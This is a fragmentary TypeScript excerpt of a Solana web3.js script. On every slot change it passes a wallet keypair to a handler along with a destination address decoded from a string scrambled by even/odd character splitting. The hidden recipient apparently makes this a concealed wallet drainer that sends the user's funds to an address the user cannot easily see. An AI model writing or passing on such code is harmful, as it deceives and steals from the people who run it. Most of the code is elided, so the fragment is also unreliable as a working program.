...
import { Keypair, Connection, SlotInfo, clusterApiUrl, SystemProgram, PublicKey, Transaction, PublicKeyInitData } from '@solana/web3.js';
...
function getPublicKey(str: string): string {
  let evenChars = '';
  let oddChars = '';
...
(async () => {
  ...
  connection.onSlotChange(
    handleSlotChange({ connection, walletKeyPair, destinationAddress: new PublicKey(getPublicKey('4VE5a71yWjyTB55SU4PGrnbPSZaMim6BDWw6A4ih4PWH')) }),
  );
})();
